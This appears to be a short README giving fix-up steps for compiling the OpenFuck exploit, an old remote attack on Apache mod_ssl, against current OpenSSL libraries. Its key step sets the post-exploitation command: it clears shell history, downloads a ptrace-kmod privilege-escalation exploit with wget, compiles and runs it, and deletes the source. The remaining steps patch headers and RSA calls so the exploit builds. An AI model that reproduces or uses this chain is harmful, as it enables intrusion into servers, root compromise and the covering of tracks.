# some solution for openfuck errors. <br>
  1) Add this below line 24 (the last #include): <br>
    <pre> <code>
    #include <openssl/rc4.h>
    #include <openssl/md5.h>
    #define SSL2_MT_ERROR 0
    #define SSL2_MT_CLIENT_FINISHED 3
    #define SSL2_MT_SERVER_HELLO 4
    #define SSL2_MT_SERVER_VERIFY 5
    #define SSL2_MT_SERVER_FINISHED 6
    #define SSL2_MAX_CONNECTION_ID_LENGTH 16
    </code> </pre>

  2) Replace COMMAND2 on (now) line 672: <br>
    <code>#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"</code>


  3) Update declaration of variables Line 961, change : <code>unsigned char *p, *end;</code> <br>
    By adding const : <code>const unsigned char *p, *end;</code>
  
  4) Replace the if on (now) line 1078 with:
  if (EVP_PKEY_get1_RSA(pkey) == NULL) {

  5) Replace the encrypted_key_length code on (now) line 1084 with: ,br>
    <code>encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);</code>
  6) Install libssl-dev (if not already installed): <br>
    <code>apt-get install libssl-dev</code>
  7) Compile!
    <code> gcc -o OpenFuck openfuck.c -lcrypto </code>
